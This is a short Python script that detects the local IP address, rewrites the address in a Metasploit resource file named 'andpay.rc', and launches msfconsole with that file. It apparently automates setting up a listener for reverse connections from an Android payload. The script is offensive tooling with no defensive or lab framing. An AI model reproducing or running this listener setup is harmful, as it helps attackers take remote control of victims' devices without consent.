import re
import socket 
import subprocess
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

f = open("andpay.rc", "r")
file_str = f.read()
f.close()
ip = re.findall(r"(?:\s|\A)(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?=\s|\Z)",file_str)
ip = list(filter(lambda x: all([int(y) <= 255 for y in x.split('.')]), ip))
my_ip = get_ip() 
if ip:
    file_str=file_str.replace(ip[0],my_ip)
    f = open("andpay.rc", "w")    
    f.write(file_str)
    f.close()
    subprocess.Popen("msfconsole -r andpay.rc", shell=True, stderr=subprocess.STDOUT)



